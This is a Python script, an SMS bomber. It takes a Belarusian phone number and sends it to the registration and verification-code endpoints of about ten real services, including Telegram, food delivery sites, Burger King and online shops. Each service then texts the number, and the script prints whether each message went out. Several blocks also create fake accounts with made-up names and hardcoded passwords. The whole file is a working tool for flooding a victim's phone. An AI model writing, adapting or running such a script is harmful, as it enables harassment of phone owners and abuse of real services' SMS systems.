import os, sys
#import fake_useragent
import requests
#import time

user = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0'
headers1 = {'user_agent': user}
print('Введите номер в формате: +375*********')
phone = input()

dates = {
	"phone": "+" + phone
}


response = requests.post('https://my.telegram.org/auth/send_password', data=dates, headers=headers1)
if response.status_code == 200:
    print("Смс от telegram отправлено!")
else:
    print("Смс от telegram не отправлено!")

dates = {
    "CSRF":	"",
	"ACTION":	"REGISTER",
	"MODE":	"PHONE",
	"PHONE": phone,
	"PASSWORD": "123321123У",
	"PASSWORD2": "123321123У"
}

response = requests.post('https://sushihouse.by/?action=auth', data=dates, headers=headers1)

if response.status_code == 200:
    print("Смс от sushihouse отправлено!")
else:
    print("Смс от sushihouse не отправлено!")


dates = {
	"PROPERTY[NAME]": "Виктор",
    "PROPERTY[PHONE]": f"{phone}"
}

response = requests.post('https://delivio.by/be/api/register', json={"phone": f"{phone}"}, headers=headers1)
if response.status_code == 201:
    print("Смс от delivio отправлено!")
else:
    print("Смс от delivio не отправлено!")

dates = {
	"_token": "YhD2mlzKocENXnqmSbhNidVuVElRpX2wAifKrbdB",
	"step":	"1",
	"phone": f"{phone}",
	"smsCode": "",
	"email": "",
	"password":	""
}

sess = requests.Session()

response = requests.post('https://api.static.edostavka.by/rest/Json', json={"CRC":"","Packet":{"JWT":"null","MethodName":"DiscountClub.PutManDiscountShort","ServiceNumber":"01093ABC-6B36-450D-8FAF-EA32BCC2EAE8","Data":{"SourceName":"edostavka.by","LoginNameTypeId":2,"TargetId":"30,31,32","MobileOperatorId":"-1","Family":"-1","WhatSex":"-1","Phone2":"","Address1Name":"","Porch":"","Floorx":"","Address2Name":"","DateOfBirth":"","EMail":"proverkasite238@gmail.com","Phone1":f"{phone[1:]}","Name2":"Иван","Name1":"Иванович","Name3":"Иванов","Password":"123321123Egor","passwordRepeat":"123321123Egor","isVisiblePassword":"false"}}}, headers=headers1)

if response.status_code == 201 or response.status_code == 200:
    print("Смс от edostavka отправлено!")
else:
    print("Смс от edostavka не отправлено!")
    
    

dates = {
	"bxajaxid": "ajax",
	"auth_action": "send_code_sms",
	"PHONE": f"{phone}"
}

sess = requests.Session()

response = requests.post('https://gippo-market.by/local/components/slam/smart.auth/ajax.php', data=dates, headers=headers1)

if response.status_code == 200:
    print('Смс от gippo-market отправлено!')
else:
    print('Смс от gippo-market не отправлено!')
    
    
    
dates = {
	"ajax": "register",
    "login": "morsik",
    "pass": "123321123Eg",
    "phone": f"{phone}",
    "code": "",
    "company": "0",
    "resend": "1",
    "checksum": "570"
}

response = requests.post('https://carte.by/auth/', data=dates, headers=headers1)

if response.status_code == 200:
    print("Смс от carte отправлено!")
else:
    print("Смс от carte не отправлено!")
    
    
dates = {
	"CSRF": "",
    "ACTION": "REGISTER",
    "MODE":	"PHONE",
    "PHONE": f"{phone}",
    "PASSWORD":	"123321123Eg",
    "PASSWORD2": "123321123Eg"
}

response = requests.post('https://yakuzasushi.by/?action=auth', data=dates, headers=headers1)
if response.status_code == 200:
    print("Смс от yakuzasushi отправлено!")
else:
    print("Смс от yakuzasushi не отправлено!")
    
headers1 = {
    "user-agent": user,
    "Accept": "*/*",
    "device-uuid": "f83a6b92-7ccb-4f99-9211-47c557bb25f4"
    }

response = requests.post('https://burger-king.by/api/v1/web/auth/phone', json={"phoneNumber":f"{phone}","clientRequestType":"website"}, headers=headers1)
if response.status_code == 200:
    print("Смс от burger-king отправлено!")
else:
    print("Смс от burger-king не отправлено!")
    
    
    
response = requests.post('https://api.static.emall.by/rest/Json', json={"CRC":"","Packet":{"JWT":"null","MethodName":"DiscountClub.PutManDiscountShort","ServiceNumber":"C3546D1F-311F-4A6B-BFA5-DD52CDEEB373","Data":{"SourceName":"emall.by","LoginNameTypeId":2,"TargetId":"33,34,35","MobileOperatorId":"-1","Family":"-1","WhatSex":"-1","Phone2":"","Address1Name":"","Porch":"","Floorx":"","Address2Name":"","DateOfBirth":"","EMail":"proverkasite238@gmail.com","Phone1":f"{phone[1:]}","Name2":"Иванов","Name1":"Иван","Name3":"Иванович","Password":"123321123Eg","passwordRepeat":"123321123Eg"}}}, headers=headers1)
if response.status_code == 200:
    print("Смс от emall отправлено!")
else:
    print("Смс от emall не отправлено!")